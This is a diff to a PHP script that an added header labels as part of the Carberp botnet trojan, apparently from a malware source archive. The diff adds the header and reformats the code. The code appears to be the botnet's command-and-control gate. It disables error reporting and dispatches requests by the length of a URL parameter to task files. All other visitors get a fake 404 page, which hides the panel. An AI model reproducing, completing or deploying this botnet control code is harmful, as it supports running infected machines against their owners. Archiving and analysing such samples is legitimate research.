@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -7,7 +18,8 @@ ini_set('error_reporting', 0);
 header("Pragma: no-cache");
 header("Expires: 0");
 
-function no_found(){	global $dir;
+function no_found(){
+	global $dir;
 	header("HTTP/1.1 404 Not Found");
 	header("Status: 404 Not Found");
 	print(file_get_contents($dir . '404.html'));
@@ -23,9 +35,11 @@ if(!empty($_POST['remote_ip'])){
 
 $config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
 
-if(!empty($_GET['p'])){	$l = strlen($_GET['p']);
+if(!empty($_GET['p'])){
+	$l = strlen($_GET['p']);
 	unset($_GET['p']);
-	switch(true){		case (($l >= 1 && $l <= 6) || ($l >= 18 && $l <= 24)):
+	switch(true){
+		case (($l >= 1 && $l <= 6) || ($l >= 18 && $l <= 24)):
         	include_once('task.php');
         break;
 
@@ -53,7 +67,8 @@ if(!empty($_GET['p'])){	$l = strlen($_GET['p']);
         	no_found();
         break;
     }
-}else{	no_found();
+}else{
+	no_found();
 }
 
 ?>
